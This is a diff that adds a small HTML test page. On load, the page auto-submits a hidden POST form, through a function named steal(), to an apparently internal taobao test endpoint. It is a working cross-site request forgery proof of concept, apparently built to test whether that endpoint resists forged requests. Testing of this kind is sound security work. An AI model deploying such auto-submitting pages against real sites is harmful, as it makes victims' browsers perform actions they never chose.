@@ -1,0 +1,17 @@
+<html>
+  <head>
+    <title>post 测试页面</title>
+    <script>
+      function steal(){
+        var mySubmit = document.getElementById('steal_form');
+        mySubmit.submit();
+      }
+    </script>
+  </head>
+  <body onload='steal()'>
+　　<form id = "steal_form" method="POST" action="http://test3.data.taobao.com:5678/post/check">
+　　  <input type="hidden" name="func" value="post">
+　　　<input type="hidden" name="value" value="1000">
+　　</form>
+  </body>
+</html>  
